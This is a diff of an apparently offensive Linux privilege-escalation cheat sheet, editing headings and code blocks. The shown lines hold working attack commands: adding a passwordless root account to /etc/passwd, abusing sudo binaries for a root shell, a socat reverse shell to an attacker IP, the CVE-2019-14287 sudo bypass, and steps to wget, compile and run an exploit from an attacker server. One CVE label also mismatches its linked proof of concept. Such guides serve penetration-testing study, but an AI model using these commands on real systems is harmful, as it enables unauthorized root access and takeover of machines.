@@ -16,11 +16,6 @@ Simple and accurate guide for linux privilege escalation tactics
 - Capabilities
 - NFS Root Squashing
 - chkrootkit 0.49
-- Cron Jobs
-- Running Processes
-- Cron Jobs
-- Tmux
-
 
 
 # Basic System Enumeration
@@ -64,7 +59,7 @@ If you have write permission to the following files:
 
 Structure : Linux Command // <Comment / Tip>
 
-etc/passwd
+/etc/passwd
 ```
    echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
    su - hacker
@@ -142,7 +137,7 @@ URL: https://github.com/SecWiki/linux-kernel-exploits
 
 # Sudo -l
 
-sudo -l // What binaries can we execute with sudo?
+Sudo -l // What binaries can we execute with Sudo?
 
 // Example Output
 
@@ -175,7 +170,7 @@ User www-data may run the following commands on <hostname>
 
 
 
-Absuing sudo binaries to gain root
+Absuing Sudo binaries to gain root
 ----------------------------------------------------
 find
 ```
@@ -230,7 +225,7 @@ sudo ftp - ! /bin/bash
 socat
 ```
 Attacker = Attacker= socat file:`tty`,raw,echo=0 tcp-listen:1234
-Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234 // Replace IP With your IP
+Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
 ```
 
 Zip
@@ -281,7 +276,7 @@ sudo xargs -a /dev/null sh
 
 anansi_util
 ```
-sudo /home/anansi/bin/anansi_util manual /bin/bash // Change Path - Depending on sudo -l output 
+sudo /home/anansi/bin/anansi_util manual /bin/bash  
 ```
 
 Wget
@@ -317,31 +312,35 @@ CVE:
 
 CVE-2019-14287
 
-```
 sudo -V // Get sudo version
 sudo -l
 
-   Vulnerable output 
-   Output = (ALL,!root) NOPASSWD: /bin/bash 
+Vulnerable output 
+Output = (ALL,!root) NOPASSWD: /bin/bash 
 
-    Priv Escalation Command
+```   
     sudo -u#-1 /bin/bash
     id && whoami
-
+    
 ```
+
 CVE-2019-16634
 
-```
 sudo -V // Get sudo version
-sudo su root // If you type root's password , can you see the *****? That means pw_feedback is enabled
+sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled
 Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634
 Download expliot.c
 Upload to Victim 
 
 Attacker
+```
 python -m SimpleHTTPServer 9000 // You can use any port
 
+```
+
 Victim
+
+```
 wget http://<attacker_ip>:9000/expliot.c
 Compile expliot.c: gcc expliot.c -o expliot
 ./expliot
